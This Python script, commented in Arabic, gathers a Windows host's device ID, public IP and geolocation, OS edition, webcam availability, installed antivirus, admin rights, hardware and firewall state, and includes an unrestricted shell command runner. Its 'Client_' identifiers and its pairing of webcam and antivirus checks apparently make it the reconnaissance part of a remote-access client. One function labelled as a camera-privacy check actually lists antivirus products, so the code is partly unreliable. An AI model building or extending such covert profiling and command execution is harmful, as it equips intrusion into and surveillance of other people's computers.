#!/usr/bin/env python

#https://www.pythonanywhere.com/user/RyanDirandi/files/home/RyanDirandi/test.py


import subprocess
import os
import uuid
import requests
import platform
import cv2

# --- إعداد الـ Logging العام (Global Setup) ---
# نضع هذا الكود مرة واحدة في بداية الملف، لا تكرره داخل الكلاسات
import logging, sys
# 1. تجهيز التنسيق
log_formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

# 2. تجهيز الملف والشاشة
file_handler = logging.FileHandler('app_client_debug.log', encoding='utf-8')
file_handler.setFormatter(log_formatter)

console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(log_formatter)

# 3. تطبيق الإعدادات
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)


# 4. تعريف دالة صيد الأخطاء (Global Function)
# لاحظ: هذه دالة عادية وليست داخل كلاس (لا يوجد self)
def global_handle_exception(exc_type, exc_value, exc_traceback):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    
    logging.critical("Uncaught exception", exc_info=(exc_type, exc_value, exc_traceback))

# 5. تفعيل الصائد
sys.excepthook = global_handle_exception
logger = logging.getLogger(__name__)





   #SERVER ID
def get_device_uuid():
     # جلب UUID بناءً على معلومات الجهاز
     device_uuid = uuid.UUID(int=uuid.getnode())
     # تحويل UUID إلى سلسلة نصية واستخلاص آخر 10 أحرف
     return str(device_uuid)[-10:]












# GET PUBLIC IP ADDRESS
def get_public_ip():
       try:
           # استخدام خدمة الويب "ipify" للحصول على عنوان IP العام
           response = requests.get('https://api.ipify.org?format=json')
           ip_data = response.json()
           return ip_data['ip']
       except Exception as e:
               # أولاً: سجل الخطأ بالتفصيل في الملف السري (للمطور - أنت)
           logging.error("An error occurred", exc_info=True) 
           return f"Error: {e}"









def get_location():
    try:
        # استخدام خدمة الويب "ipinfo" لجلب معلومات الموقع
        response = requests.get('https://ipinfo.io/json')
        location_data = response.json()
        return location_data.get('country'), location_data.get('region'), location_data.get('city')
    except Exception as e:
               # أولاً: سجل الخطأ بالتفصيل في الملف السري (للمطور - أنت)
           logging.error("An error occurred", exc_info=True) 
           return f"Error: {e}"





def get_country_name(country_code):
    # تحويل رمز الدولة إلى اسم الدولة الكامل
    countries = {
        "AF": "Afghanistan",
        "AL": "Albania",
        "DZ": "Algeria",
        "AS": "American Samoa",
        "AD": "Andorra",
        "AO": "Angola",
        "AI": "Anguilla",
        "AQ": "Antarctica",
        "AG": "Antigua and Barbuda",
        "AR": "Argentina",
        "AM": "Armenia",
        "AW": "Aruba",
        "AU": "Australia",
        "AT": "Austria",
        "AZ": "Azerbaijan",
        "BS": "Bahamas",
        "BH": "Bahrain",
        "BD": "Bangladesh",
        "BB": "Barbados",
        "BY": "Belarus",
        "BE": "Belgium",
        "BZ": "Belize",
        "BJ": "Benin",
        "BM": "Bermuda",
        "BT": "Bhutan",
        "BO": "Bolivia",
        "BA": "Bosnia and Herzegovina",
        "BW": "Botswana",
        "BR": "Brazil",
        "BN": "Brunei",
        "BG": "Bulgaria",
        "BF": "Burkina Faso",
        "BI": "Burundi",
        "KH": "Cambodia",
        "CM": "Cameroon",
        "CA": "Canada",
        "CV": "Cape Verde",
        "KY": "Cayman Islands",
        "CF": "Central African Republic",
        "TD": "Chad",
        "CL": "Chile",
        "CN": "China",
        "CO": "Colombia",
        "KM": "Comoros",
        "CG": "Congo",
        "CD": "Congo, Democratic Republic of the",
        "CR": "Costa Rica",
        "CI": "Côte d'Ivoire",
        "HR": "Croatia",
        "CU": "Cuba",
        "CY": "Cyprus",
        "CZ": "Czech Republic",
        "DK": "Denmark",
        "DJ": "Djibouti",
        "DM": "Dominica",
        "DO": "Dominican Republic",
        "EC": "Ecuador",
        "EG": "Egypt",
        "SV": "El Salvador",
        "GQ": "Equatorial Guinea",
        "ER": "Eritrea",
        "EE": "Estonia",
        "ET": "Ethiopia",
        "FJ": "Fiji",
        "FI": "Finland",
        "FR": "France",
        "GA": "Gabon",
        "GM": "Gambia",
        "GE": "Georgia",
        "DE": "Germany",
        "GH": "Ghana",
        "GR": "Greece",
        "GD": "Grenada",
        "GU": "Guam",
        "GT": "Guatemala",
        "GN": "Guinea",
        "GW": "Guinea-Bissau",
        "GY": "Guyana",
        "HT": "Haiti",
        "HN": "Honduras",
        "HK": "Hong Kong",
        "HU": "Hungary",
        "IS": "Iceland",
        "IN": "India",
        "ID": "Indonesia",
        "IR": "Iran",
        "IQ": "Iraq",
        "IE": "Ireland",
        "IL": "Israel",
        "IT": "Italy",
        "JM": "Jamaica",
        "JP": "Japan",
        "JO": "Jordan",
        "KZ": "Kazakhstan",
        "KE": "Kenya",
        "KI": "Kiribati",
        "KP": "Korea, North",
        "KR": "Korea, South",
        "KW": "Kuwait",
        "KG": "Kyrgyzstan",
        "LA": "Laos",
        "LV": "Latvia",
        "LB": "Lebanon",
        "LS": "Lesotho",
        "LR": "Liberia",
        "LY": "Libya",
        "LI": "Liechtenstein",
        "LT": "Lithuania",
        "LU": "Luxembourg",
        "MO": "Macau",
        "MK": "Macedonia",
        "MG": "Madagascar",
        "MW": "Malawi",
        "MY": "Malaysia",
        "MV": "Maldives",
        "ML": "Mali",
        "MT": "Malta",
        "MH": "Marshall Islands",
        "MR": "Mauritania",
        "MU": "Mauritius",
        "MX": "Mexico",
        "FM": "Micronesia",
        "MD": "Moldova",
        "MC": "Monaco",
        "MN": "Mongolia",
        "ME": "Montenegro",
        "MS": "Montserrat",
        "MA": "Morocco",
        "MZ": "Mozambique",
        "MM": "Myanmar",
        "NA": "Namibia",
        "NR": "Nauru",
        "NP": "Nepal",
        "NL": "Netherlands",
        "NZ": "New Zealand",
        "NI": "Nicaragua",
        "NE": "Niger",
        "NG": "Nigeria",
        "NO": "Norway",
        "OM": "Oman",
        "PK": "Pakistan",
        "PW": "Palau",
        "PS": "Palestine",
        "PA": "Panama",
        "PG": "Papua New Guinea",
        "PY": "Paraguay",
        "PE": "Peru",
        "PH": "Philippines",
        "PL": "Poland",
        "PT": "Portugal",
        "QA": "Qatar",
        "RO": "Romania",
        "RU": "Russia",
        "RW": "Rwanda",
        "WS": "Samoa",
        "SM": "San Marino",
        "SA": "Saudi Arabia",
        "SN": "Senegal",
        "RS": "Serbia",
        "SC": "Seychelles",
        "SL": "Sierra Leone",
        "SG": "Singapore",
        "SK": "Slovakia",
        "SI": "Slovenia",
        "SB": "Solomon Islands",
        "SO": "Somalia",
        "ZA": "South Africa",
        "SS": "South Sudan",
        "ES": "Spain",
        "LK": "Sri Lanka",
        "SD": "Sudan",
        "SR": "Suriname",
        "SZ": "Swaziland",
        "SE": "Sweden",
        "CH": "Switzerland",
        "SY": "Syria",
        "TW": "Taiwan",
        "TJ": "Tajikistan",
        "TZ": "Tanzania",
        "TH": "Thailand",
        "TL": "Timor-Leste",
        "TG": "Togo",
        "TK": "Tokelau",
        "TO": "Tonga",
        "TT": "Trinidad and Tobago",
        "TN": "Tunisia",
        "TR": "Turkey",
        "TM": "Turkmenistan",
        "TV": "Tuvalu",
        "UG": "Uganda",
        "UA": "Ukraine",
        "AE": "United Arab Emirates",
        "GB": "United Kingdom",
        "US": "United States",
        "UY": "Uruguay",
        "UZ": "Uzbekistan",
        "VU": "Vanuatu",
        "VA": "Vatican City",
        "VE": "Venezuela",
        "VN": "Vietnam",
        "YE": "Yemen",
        "ZM": "Zambia",
        "ZW": "Zimbabwe"
    }
    return countries.get(country_code, "Unknown Country")














def get_os_edition():
    try:
        # تنفيذ أمر PowerShell لجلب معلومات الإصدار
        result = subprocess.run(["powershell", "-Command", "(Get-WmiObject -Class Win32_OperatingSystem).Caption"], capture_output=True, text=True)
        os_edition = result.stdout.strip()
        # إزالة كلمة "Microsoft" من الاسم إذا كانت موجودة
        if os_edition.startswith("Microsoft"):
            os_edition = os_edition.replace("Microsoft ", "")
        return os_edition
    except Exception as e:
               # أولاً: سجل الخطأ بالتفصيل في الملف السري (للمطور - أنت)
           logging.error("An error occurred", exc_info=True) 
           return f"Error: {e}"
















#CHECK CAM STATUS
def check_camera():
    # محاولة الوصول إلى الكاميرا الافتراضية (عادةً الكاميرا الأمامية)
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        # إذا كانت الكاميرا مفعّلة، سيتم فتحها بنجاح
        logger.info("Camera is present and enabled.")
        cap.release()
        return True
    else:
        # إذا لم تكن الكاميرا مفعّلة أو غير متاحة
        logger.info("Camera is not present or not enabled.")
        return False








def check_camera_privacy():
    try:
        # تنفيذ أمر PowerShell للتحقق من إعدادات الخصوصية للكاميرا
        command = "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
        # تحليل نتيجة الأمر
        privacy_settings = result.stdout
        if "Allow" in privacy_settings:
            return "Camera is allowed by privacy settings."
        else:
            return "Camera is not allowed by privacy settings."
    except Exception as e:
               # أولاً: سجل الخطأ بالتفصيل في الملف السري (للمطور - أنت)
           logging.error("An error occurred", exc_info=True) 
           return f"Error: {e}"








def execute_system_command(command):
    try:
        #logger.info(f"[+] Executing system command: {command}")  # طباعة رسالة تأكيد تنفيذ الأمر
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE)  # تنفيذ الأمر والحصول على المخرجات والأخطاء
        output, error = result.communicate()  # تخزين المخرجات والأخطاء
        if error:
            logger.info(f"[-] Error executing system command: {error.decode()}")  # طباعة رسالة خطأ إذا كانت هناك أخطاء
            raise Exception(error.decode())  # إثارة استثناء مع رسالة الخطأ
        logger.info(f"[+] Command result: {output.decode()}")  # طباعة نتيجة الأمر
        return output.decode()  # إرجاع نتيجة الأمر
    except Exception as e:
        logger.error(f"[-] General Error executing system command: ", exc_info=True)  # طباعة رسالة خطأ عامة
        raise e  # إثارة الاستثناء





def get_antivirus_info():
       # استخدام أمر PowerShell لجلب أسماء برامج مكافحة الفيروسات النشطة
       command = 'powershell.exe -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"'
       result = execute_system_command(command)  # تنفيذ الأمر وإرجاع النتيجة
       lines = result.splitlines()  # تقسيم النتيجة إلى سطور
       if len(lines) == 1:  # إذا كانت هناك نتيجة واحدة فقط
           return lines[0].strip()  # إرجاع النتيجة
       elif len(lines) > 1:  # إذا كانت هناك نتائج متعددة
           return lines[1].strip()  # إرجاع النتيجة الثانية
       return "No antivirus found"  # إذا لم يتم العثور على أي برنامج مكافحة فيروسات









#Server ID
device_uuid = get_device_uuid()
server_name = "Client_"
fullSerId = server_name+device_uuid





#ComputerName + User Name
   # لجلب اسم الكمبيوتر
computer_name = os.environ['COMPUTERNAME']
   # لجلب اسم المستخدم الحالي
user_name = os.environ['USERNAME']
DevNameUserName= computer_name + "/" + user_name




#Public IP
public_ip = get_public_ip()



#Country Name & Region & City
country_code, region, city = get_location()
country_name = get_country_name(country_code)
logger.info(f"Country:%s {country_name}, Region:%s {region}, City:%s {city}")




#Get Sys Infos
   # جلب معلومات نظام التشغيل
operating_system = platform.system()
os_version = platform.version()
os_release = platform.release()
os_edition = get_os_edition()
# جلب معلومات المعمارية (32 بت أو 64 بت)
architecture = platform.architecture()[0]

FullSysInfos = os_edition+" "+architecture
# طباعة المعلومات
logger.info(f"OS: {os_edition} {architecture}")

#logger.info(f"OS Version: {os_version}")
#logger.info(f"OS Release: {os_release}")
#logger.info(f"Architecture: {architecture}")





#Check Camera
   # التحقق من وجود الكاميرا
camera_status = check_camera()
privacy_status = check_camera_privacy()
logger.info(f"Camera status:%s {'Enabled%s' if camera_status else 'Not enabled%s'}")
   # التحقق من إعدادات الخصوصية للكاميرا
logger.info(f"Camera Privacy Status: {privacy_status}")



#GET USER PREVILAGE
import ctypes
def is_admin():
    result =ctypes.windll.shell32.IsUserAnAdmin() != 0
    if result == True:
        return "Admin"
    else:
        return "User"


logger.info(f"المستخدم لديه صلاحيات المسؤول: { is_admin()}")




import psutil

# CPU
CPU_COUNT = psutil.cpu_count(logical=True)
logger.info(f"عدد الأنوية: {CPU_COUNT}")


logger.info(f"الاستخدام الحالي للمعالج:{psutil.cpu_percent(interval=1)}%")

# RAM
ram = psutil.virtual_memory()
merge = int(ram.total / (1024**3))
RAM_TOTAL= str(merge) + " GB"
logger.info(f"إجمالي الذاكرة RAM: {RAM_TOTAL} GB")
logger.info(f"الذاكرة المتاحة: {ram.available / (1024**3):.2f} GB")
logger.info(f"استخدام الذاكرة: %{ram.percent}%")




#FIREWALL STATE + ALL DETAILS
import subprocess

firewall_status = subprocess.run(["netsh", "advfirewall", "show", "allprofiles"], capture_output=True, text=True)
logger.info(firewall_status.stdout)



#CHECK ONLY IF THE FIREWALL IS ON OR OFF
import subprocess

def is_firewall_enabled():
    result = subprocess.run(["netsh", "advfirewall", "show", "currentprofile"], capture_output=True, text=True)
    return "ON" in result.stdout  # يتحقق إذا كانت الحالة "ON"

logger.info(f"الجدار الناري مُفعل؟{ is_firewall_enabled()}")